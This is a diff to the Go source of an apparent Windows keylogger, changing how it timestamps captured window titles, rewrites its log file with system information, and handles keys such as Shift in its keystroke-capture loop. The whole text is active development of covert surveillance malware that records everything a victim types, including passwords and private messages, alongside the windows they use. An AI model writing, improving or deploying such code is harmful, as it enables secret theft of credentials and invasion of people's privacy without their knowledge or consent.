@@ -169,7 +169,6 @@ func getSystemWindowsDirectory(lpBuffer *byte) (len int32, err error) {
 
 func fileInterval() {
 	writeTicker := time.NewTicker(10 * time.Second)
-	dateTicker := time.NewTicker(1 * time.Minute)
 
 	go func() {
 		for {
@@ -177,8 +176,6 @@ func fileInterval() {
 			case <-writeTicker.C:
 				writeLogFile(eventsBuf)
 				eventsBuf = ""
-			case <-dateTicker.C:
-				writeLogFile("(log " + time.Now().Format("2006-01-02 15:04:05") + ")")
 			}
 		}
 	}()
@@ -198,15 +195,13 @@ func writeLogFile(data string) {
 }
 
 func createLogFile() {
-	if _, statErr := os.Stat(logFile); os.IsNotExist(statErr) {
-		file, createErr := os.Create(logFile)
-		if createErr != nil {
-			log.Fatalf("createLogFile -> %v", createErr)
-		}
-
-		defer file.Close()
-		file.WriteString(systemInfoData.String())
+	file, createErr := os.Create(logFile)
+	if createErr != nil {
+		log.Fatalf("createLogFile -> %v", createErr)
 	}
+
+	defer file.Close()
+	file.WriteString(systemInfoData.String())
 }
 
 func getOutboundIP() net.IP {
@@ -252,7 +247,7 @@ func windowLogger() {
 
 		if syscall.UTF16ToString(window) != "" && tmpTitle != syscall.UTF16ToString(window) {
 			tmpTitle = syscall.UTF16ToString(window)
-			tmpWindow <- string("[" + syscall.UTF16ToString(window) + "]\r\n")
+			tmpWindow <- string("(" + time.Now().Format("2006-01-02 15:04:05") + ")" + "[" + syscall.UTF16ToString(window) + "]\r\n")
 		}
 		time.Sleep(1 * time.Millisecond)
 	}
@@ -318,12 +313,12 @@ func keyLogger() {
 				tmpKeylog <- "-"
 			case constants.VK_DECIMAL:
 				tmpKeylog <- "."
+			case constants.VK_SHIFT:
 			case constants.VK_LBUTTON:
 			case constants.VK_RBUTTON:
 			case constants.VK_MBUTTON:
 			case constants.VK_BACK:
 			case constants.VK_TAB:
-			case constants.VK_SHIFT:
 			case constants.VK_MENU:
 			case constants.VK_CAPITAL:
 			case constants.VK_ESCAPE:
@@ -380,7 +375,6 @@ func keyLogger() {
 			case constants.VK_RMENU:
 				tmpKeylog <- ""
 			default:
-				getLanguage()
 				unicodeKey := getUnicodeKey(Key)
 				tmpKeylog <- unicodeKey
 			}
